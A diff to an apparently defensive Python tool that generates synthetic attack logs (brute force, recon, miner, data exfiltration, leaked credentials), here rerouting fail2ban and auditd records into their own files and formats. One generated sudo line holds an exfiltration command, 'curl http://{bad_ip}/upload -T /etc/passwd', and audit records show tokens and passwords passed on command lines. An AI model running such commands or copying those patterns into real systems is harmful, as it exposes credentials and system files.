@@ -46,6 +46,12 @@ FAC_AUTH   = 4
 FAC_SYSLOG = 5
 FAC_CRON   = 9
 
+# Not syslog facilities. fail2ban and auditd write their own files directly,
+# in their own formats, bypassing rsyslog entirely -- these sentinels let
+# write_line() route them without inventing a fake facility.
+FAC_FAIL2BAN = -1
+FAC_AUDITD   = -2
+
 # Severities
 SEV_EMERG   = 0
 SEV_ALERT   = 1
@@ -68,6 +74,9 @@ FACILITY_FILES = {
     FAC_AUTH:   ["auth", "syslog"],
     FAC_SYSLOG: ["syslog"],
     FAC_CRON:   ["cron", "syslog"],
+    # Own file only: a real fail2ban/auditd record never reaches syslog.
+    FAC_FAIL2BAN: ["fail2ban"],
+    FAC_AUDITD:   ["audit"],
 }
 
 FILE_NAMES = {
@@ -75,6 +84,8 @@ FILE_NAMES = {
     "kern":   "kern.log",
     "cron":   "cron.log",
     "syslog": "syslog",
+    "fail2ban": "fail2ban.log",
+    "audit":    "audit/audit.log",
 }
 
 # ---------------------------------------------------------------------------
@@ -167,6 +178,28 @@ def auth_line(severity, app, procid, msg, msgid="-"):
 
 def kern_line(severity, msg, msgid="-"):
     return make_entry(FAC_KERN, severity, "kernel", "0", msg, msgid)
+
+def auditd_line(msg):
+    """A raw auditd record for /var/log/audit/audit.log.
+
+    auditd writes this file itself, so there is no syslog header and no
+    priority -- the record starts straight at "type=".
+    """
+    return (FAC_AUDITD, msg, msg)
+
+def fail2ban_line(level, logger, msg):
+    """A record in fail2ban's own log format, not syslog's.
+
+    fail2ban's default logtarget on Debian is /var/log/fail2ban.log, written
+    through Python logging:
+        %(asctime)s %(name)-24s [%(process)d]: %(levelname)-7s %(message)s
+    Note the comma before the milliseconds -- that is Python logging, and it
+    is what makes this file need its own parser.
+    """
+    now = datetime.now()
+    ts = now.strftime("%Y-%m-%d %H:%M:%S") + ",{:03d}".format(now.microsecond // 1000)
+    line = "{} {:<24} [{}]: {:<7} {}".format(ts, logger, spid("fail2ban"), level, msg)
+    return (FAC_FAIL2BAN, line, line)
 
 def cron_line(severity, msg):
     return make_entry(FAC_CRON, severity, "CRON", epid(), msg)
@@ -345,7 +378,7 @@ def seq_auditd_benign():
     cmd_fn = random.choice(BENIGN_AUDIT_CMDS)
     pid    = epid()
     return [
-        kern_line(SEV_INFO, cmd_fn()),
+        auditd_line(cmd_fn()),
     ]
 
 # Weighted background noise pool
@@ -379,7 +412,13 @@ def scenario_brute_force():
     for _ in range(random.randint(18, 35)):
         attempt_user = random.choice(["root", "admin", "ubuntu", "pi", user])
         lines += seq_ssh_fail(user=attempt_user, ip=ip)
-    lines += [auth_line(SEV_NOTICE, "fail2ban", spid("fail2ban"), f"[sshd] Ban {ip}")]
+    # fail2ban logs to its own file, not to auth.log: the filter sees each
+    # failure, then the action bans. This is the line that turns a pile of
+    # failed passwords into a detection.
+    lines += [
+        fail2ban_line("INFO", "fail2ban.filter", f"[sshd] Found {ip}"),
+        fail2ban_line("NOTICE", "fail2ban.actions", f"[sshd] Ban {ip}"),
+    ]
     return lines
 
 def scenario_privilege_escalation():
@@ -410,9 +449,9 @@ def scenario_data_exfil():
                             f"LEN={random.randint(1400,1500)} PROTO=TCP SPT={rand_port()} DPT=443",
                             msgid="UFW_ALLOW")]
     lines += [
-        auth_line(SEV_WARNING, "audit", pid,
-                  f"type=1400 apparmor=\"ALLOWED\" operation=\"exec\" profile=\"unconfined\" "
-                  f"name=\"/usr/bin/curl\" pid={pid} comm=\"curl\""),
+        auditd_line(
+                  f"type=AVC msg=audit({_atime()}): apparmor=\"ALLOWED\" operation=\"exec\" "
+                  f"profile=\"unconfined\" name=\"/usr/bin/curl\" pid={pid} comm=\"curl\""),
         auth_line(SEV_ERR, "sudo", pid,
                   f"deploy : command not allowed ; TTY=pts/1 ; "
                   f"PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl http://{bad_ip}/upload -T /etc/passwd"),
@@ -443,9 +482,9 @@ def scenario_crypto_miner():
                   f"[UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
                   f"LEN=1480 PROTO=TCP SPT={rand_port()} DPT=3333",
                   msgid="UFW_ALLOW"),
-        kern_line(SEV_WARNING,
-                  f"audit: type=1326 arch=c000003e syscall=56 success=yes exit=0 "
-                  f"items=0 ppid=1 pid={pid} auid=1000 uid=1000 "
+        auditd_line(
+                  f"type=SECCOMP msg=audit({_atime()}): arch=c000003e syscall=56 "
+                  f"success=yes exit=0 items=0 ppid=1 pid={pid} auid=1000 uid=1000 "
                   f"comm=\"xmrig\" exe=\"/tmp/.x/xmrig\""),
         kern_line(SEV_ERR,
                   f"[UFW ALLOW] IN= OUT=eth0 SRC={rand_internal()} DST={bad_ip} "
@@ -467,7 +506,13 @@ def scenario_recon():
                             f"DST={rand_internal()} LEN=44 PROTO=TCP SPT={rand_port()} "
                             f"DPT={port} WINDOW=1024 RES=0x00 SYN URGP=0",
                             msgid="UFW_BLOCK")]
-    lines += [auth_line(SEV_NOTICE, "fail2ban", spid("fail2ban"), f"[sshd] Ban {ip}")]
+    # fail2ban logs to its own file, not to auth.log: the filter sees each
+    # failure, then the action bans. This is the line that turns a pile of
+    # failed passwords into a detection.
+    lines += [
+        fail2ban_line("INFO", "fail2ban.filter", f"[sshd] Found {ip}"),
+        fail2ban_line("NOTICE", "fail2ban.actions", f"[sshd] Ban {ip}"),
+    ]
     return lines
 
 def _auditd_preamble(user):
@@ -493,12 +538,12 @@ def scenario_leak_bearer_token():
                                "api.github.com", "api.pagerduty.com"])
     lines = _auditd_preamble(user)
     lines += [
-        kern_line(SEV_INFO,
+        auditd_line(
             f"type=EXECVE msg=audit({atime}): argc=5 "
             f"a0=\"/usr/bin/curl\" a1=\"-s\" a2=\"-H\" "
             f"a3=\"Authorization: Bearer {api_token}\" "
             f"a4=\"https://{api_host}/v1/messages\""),
-        kern_line(SEV_INFO,
+        auditd_line(
             f"type=SYSCALL msg=audit({atime}): arch=c000003e syscall=59 success=yes exit=0 "
             f"a0=55a3b2 a1=55a3c4 a2=55a3d8 a3=0 items=2 ppid={ppid} pid={pid} "
             f"auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 "
@@ -519,12 +564,12 @@ def scenario_leak_bch_key():
     bch_key, bch_secret = random.choices(BCH_KEY_PAIRS, weights=BCH_KEY_WEIGHTS, k=1)[0]
     lines = _auditd_preamble(user)
     lines += [
-        kern_line(SEV_INFO,
+        auditd_line(
             f"type=EXECVE msg=audit({_atime()}): argc=3 "
             f"a0=\"/bin/bash\" "
             f"a1=\"/opt/deploy.sh\" "
             f"a2=\"BCH_ACCESS_KEY_ID={bch_key} BCH_SECRET_ACCESS_KEY={bch_secret}\""),
-        kern_line(SEV_INFO,
+        auditd_line(
             f"type=SYSCALL msg=audit({_atime()}): arch=c000003e syscall=59 success=yes exit=0 "
             f"items=2 ppid={epid()} pid={epid()} auid=1000 uid=1000 gid=1000 euid=1000 "
             f"comm=\"bash\" exe=\"/bin/bash\" key=\"execve_track\""),
@@ -547,14 +592,14 @@ def scenario_leak_db_password():
     db_host = rand_internal()
     lines = _auditd_preamble(user)
     lines += [
-        kern_line(SEV_INFO,
+        auditd_line(
             f"type=EXECVE msg=audit({_atime()}): argc=8 "
             f"a0=\"/usr/bin/psql\" "
             f"a1=\"-h\" a2=\"{db_host}\" "
             f"a3=\"-U\" a4=\"{db_user}\" "
             f"a5=\"-W\" a6=\"{db_pass}\" "
             f"a7=\"appdb\""),
-        kern_line(SEV_INFO,
+        auditd_line(
             f"type=SYSCALL msg=audit({_atime()}): arch=c000003e syscall=59 success=yes exit=0 "
             f"items=2 ppid={epid()} pid={epid()} auid=1000 uid=1000 gid=1000 euid=1000 "
             f"comm=\"psql\" exe=\"/usr/bin/psql\" key=\"execve_track\""),
@@ -632,6 +677,13 @@ def write_line(facility, syslog_line, bsd_line, logdir, quiet):
     targets = FACILITY_FILES.get(facility, ["syslog"])
     for target in targets:
         path = os.path.join(logdir, FILE_NAMES[target])
+        # audit/audit.log sits in a subdirectory that may not exist yet.
+        parent = os.path.dirname(path)
+        if parent and not os.path.isdir(parent):
+            try:
+                os.makedirs(parent, exist_ok=True)
+            except OSError:
+                continue
         # syslog gets RFC 5424 (with <priority>); split files get BSD format
         content = syslog_line if target == "syslog" else bsd_line
         with open(path, "a") as f:
